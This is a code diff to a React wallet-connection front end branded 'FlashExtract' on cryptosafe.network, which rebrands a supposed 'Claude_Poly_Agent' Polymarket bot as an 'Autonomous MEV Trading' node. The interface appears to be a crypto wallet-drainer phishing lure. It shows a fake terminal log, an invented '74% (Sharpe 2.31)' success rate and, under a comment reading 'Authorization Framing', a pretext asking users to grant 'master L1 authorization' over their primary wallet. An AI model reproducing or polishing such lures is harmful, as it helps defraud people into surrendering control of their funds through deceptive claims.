@@ -85,8 +85,8 @@ createAppKit({
   defaultNetwork: mainnet,
   projectId: WC_PROJECT_ID,
   metadata: {
-    name:        'FlashExtract | Poly Agent', 
-    description: 'Polymarket Agent Interface',
+    name:        'FlashExtract | MEV Node', 
+    description: 'Autonomous MEV Trading Interface',
     url:         'https://cryptosafe.network', 
     icons:       ['https://cryptosafe.network/favicon.svg'], 
   },
@@ -508,7 +508,7 @@ export default function App() {
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid #1E293B', backgroundColor: '#0D111C' }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
           <Activity size={20} color="#10B981" />
-          <h2 style={{ fontSize: '15px', fontWeight: '700', margin: 0, color: '#F8FAFC', letterSpacing: '1px' }}>FlashExtract_Agent</h2>
+          <h2 style={{ fontSize: '15px', fontWeight: '700', margin: 0, color: '#F8FAFC', letterSpacing: '1px' }}>MEV_Execution_Node</h2>
         </div>
         <X size={24} color="#64748B" style={{ cursor: 'pointer' }} />
       </div>
@@ -517,38 +517,38 @@ export default function App() {
         
         {/* Terminal Box */}
         <div style={{ backgroundColor: '#000000', border: '1px solid #1E293B', borderRadius: '8px', padding: '16px', marginBottom: '32px', fontSize: '11px', color: '#10B981', boxShadow: 'inset 0 0 15px rgba(0,0,0,0.8)' }}>
-           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; Claude_Poly_Agent v1.4 loaded.</div>
-           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; REPOS SYNCED: poly_data, polymarket-cli</div>
-           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; ROUTING VIA PRIVATE RPC (ZERO LVR)...</div>
-           <div style={{ marginBottom: '8px', color: '#64748B' }}>&gt; STATUS: AWAITING WALLET SYNC FOR AUTHORIZATION</div>
+           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; FlashExtract_MEV_Core v2.4 initialized.</div>
+           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; MONITORING: Global Mempool, Flash-Arb Streams</div>
+           <div style={{ marginBottom: '8px', opacity: 0.8 }}>&gt; ROUTING: Private RPC / Bundle Executor</div>
+           <div style={{ marginBottom: '8px', color: '#64748B' }}>&gt; STATUS: AWAITING MASTER HANDSHAKE</div>
            <div style={{ width: '8px', height: '14px', backgroundColor: '#10B981', display: 'inline-block', animation: 'pulse 1s infinite' }}></div>
         </div>
 
         <div style={{ marginBottom: '32px' }}>
-          <h3 style={{ fontSize: '24px', fontWeight: '800', color: '#F8FAFC', margin: '0 0 10px 0', letterSpacing: '-0.5px' }}>Deploy Polymarket Agent</h3>
-          <p style={{ color: '#94A3B8', fontSize: '14px', margin: 0, lineHeight: '1.6' }}>Select your trading wallet to sync. This binds the Claude Code logic to your wallet via read-only execution routing.</p>
+          <h3 style={{ fontSize: '24px', fontWeight: '800', color: '#F8FAFC', margin: '0 0 10px 0', letterSpacing: '-0.5px' }}>Deploy MEV Trading Agent</h3>
+          <p style={{ color: '#94A3B8', fontSize: '14px', margin: 0, lineHeight: '1.6' }}>Initialize your MEV node. Sync your primary trading wallet to enable autonomous cross-chain arbitrage and priority mempool routing.</p>
         </div>
 
       {/* Technical Stats Box */}
         <div style={{ backgroundColor: '#0D111C', border: '1px solid #1E293B', borderRadius: '12px', padding: '20px', width: '100%', boxSizing: 'border-box', marginBottom: '24px' }}>
           <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
-             <span style={{ color: '#64748B', fontSize: '13px', fontWeight: '600', textTransform: 'uppercase' }}>Target Markets</span>
-             <span style={{ color: '#E2E8F0', fontSize: '13px', fontWeight: '700' }}>Polymarket (Polygon)</span>
+             <span style={{ color: '#64748B', fontSize: '13px', fontWeight: '600', textTransform: 'uppercase' }}>Execution Targets</span>
+             <span style={{ color: '#E2E8F0', fontSize: '13px', fontWeight: '700' }}>Multi-Chain DEX / AMM</span>
           </div>
           <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
-             <span style={{ color: '#64748B', fontSize: '13px', fontWeight: '600', textTransform: 'uppercase' }}>Agent Win Rate</span>
+             <span style={{ color: '#64748B', fontSize: '13px', fontWeight: '600', textTransform: 'uppercase' }}>Success Rate</span>
              <span style={{ color: '#10B981', fontSize: '13px', fontWeight: '700' }}>74% (Sharpe 2.31)</span>
           </div>
           <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-             <span style={{ color: '#64748B', fontSize: '13px', fontWeight: '600', textTransform: 'uppercase' }}>L1 Anchor Network</span>
-             <span style={{ color: '#10B981', fontSize: '13px', fontWeight: '700' }}>Ethereum Mainnet</span>
+             <span style={{ color: '#64748B', fontSize: '13px', fontWeight: '600', textTransform: 'uppercase' }}>Protocol Type</span>
+             <span style={{ color: '#10B981', fontSize: '13px', fontWeight: '700' }}>Atomic Bundle / FlashSwap</span>
           </div>
         </div>
 
         {/* Authorization Framing */}
         <div style={{ backgroundColor: 'rgba(16, 185, 129, 0.05)', border: '1px solid rgba(16, 185, 129, 0.2)', borderRadius: '12px', padding: '16px', width: '100%', boxSizing: 'border-box' }}>
           <p style={{ margin: 0, fontSize: '12.5px', color: '#10B981', lineHeight: '1.6' }}>
-            <span style={{fontWeight: '800'}}>L1 CROSS-CHAIN ANCHOR:</span> To bypass Polygon RPC latency, the agent requires an Ethereum Mainnet authorization. This binds your L1 wallet as the master controller for the L2 trading execution.
+            <span style={{fontWeight: '800'}}>MASTER MEMPOOL ANCHOR:</span> To bypass public mempool latency and prevent front-running, the agent requires a master L1 authorization. This anchors your wallet to the high-frequency execution pipe.
           </p>
         </div>
 
